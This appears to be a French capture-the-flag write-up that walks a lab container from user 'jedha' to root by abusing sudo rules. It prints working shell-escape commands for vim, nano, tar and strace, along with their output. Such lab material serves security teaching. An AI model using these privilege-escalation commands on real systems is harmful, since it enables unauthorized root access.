# Sudo Chain - Privilege Escalation

## Objectif
Escalader les privilèges à travers une chaîne d'utilisateurs pour atteindre root.

## Cible
- **Machine** : `c1258b3e740c`
- **User initial** : `jedha`
- **Chaîne** : `jedha` → `anakin` → `luke` → `darkvador` → `root`

---

## Étape 1 : jedha → anakin (vim)

### Reconnaissance
```bash
jedha@c1258b3e740c:~$ sudo -l
User jedha may run the following commands on c1258b3e740c:
    (anakin) NOPASSWD: /usr/bin/vim
```

### Fausse piste : Python dans vim
GTFOBins suggère `:py import os; os.system("/bin/sh")` mais :
```
E319: Sorry, the command is not available in this version: :py ...
```
→ Vim compilé sans support Python.

### Exploitation
```bash
sudo -u anakin vim -c ':!/bin/bash'
```

**Résultat :**
```bash
anakin@c1258b3e740c:/tmp$ id
uid=1001(anakin) gid=1001(anakin) groups=1001(anakin)
```

---

## Étape 2 : anakin → luke (nano)

### Reconnaissance
```bash
anakin@c1258b3e740c:/tmp$ sudo -l
User anakin may run the following commands on c1258b3e740c:
    (luke) NOPASSWD: /usr/bin/nano
```

### Exploitation
```bash
sudo -u luke nano
```
Puis dans nano :
1. `Ctrl+R` (Read File)
2. `Ctrl+X` (Execute Command)
3. Taper : `reset; sh 1>&0 2>&0`
4. Entrée

**Résultat :**
```bash
$ id
uid=1002(luke) gid=1002(luke) groups=1002(luke)
```

---

## Étape 3 : luke → darkvador (tar)

### Reconnaissance
```bash
$ sudo -l
User luke may run the following commands on c1258b3e740c:
    (darkvador) NOPASSWD: /usr/bin/tar
```

### Exploitation
`tar` permet d'exécuter des commandes via les checkpoints :
```bash
sudo -u darkvador tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Résultat :**
```bash
$ id
uid=1003(darkvador) gid=1003(darkvador) groups=1003(darkvador)
```

---

## Étape 4 : darkvador → root (strace)

### Reconnaissance
```bash
$ sudo -l
User darkvador may run the following commands on c1258b3e740c:
    (root) NOPASSWD: /usr/bin/strace
```

### Exploitation
`strace` peut tracer et exécuter n'importe quel processus :
```bash
sudo strace -o /dev/null /bin/sh
```

**Résultat :**
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flag

```bash
# cat /root/flag.txt
```
```
FLAG{REDACTED}
```

---

## Résumé de la chaîne

| Étape | De | Vers | Binaire | Technique |
|-------|-----|------|---------|-----------|
| 1 | jedha | anakin | vim | `:!/bin/bash` |
| 2 | anakin | luke | nano | `Ctrl+R` → `Ctrl+X` → shell |
| 3 | luke | darkvador | tar | `--checkpoint-action=exec` |
| 4 | darkvador | root | strace | `-o /dev/null /bin/sh` |

---

## Ressources GTFOBins
- [vim](https://gtfobins.github.io/gtfobins/vim/)
- [nano](https://gtfobins.github.io/gtfobins/nano/)
- [tar](https://gtfobins.github.io/gtfobins/tar/)
- [strace](https://gtfobins.github.io/gtfobins/strace/)
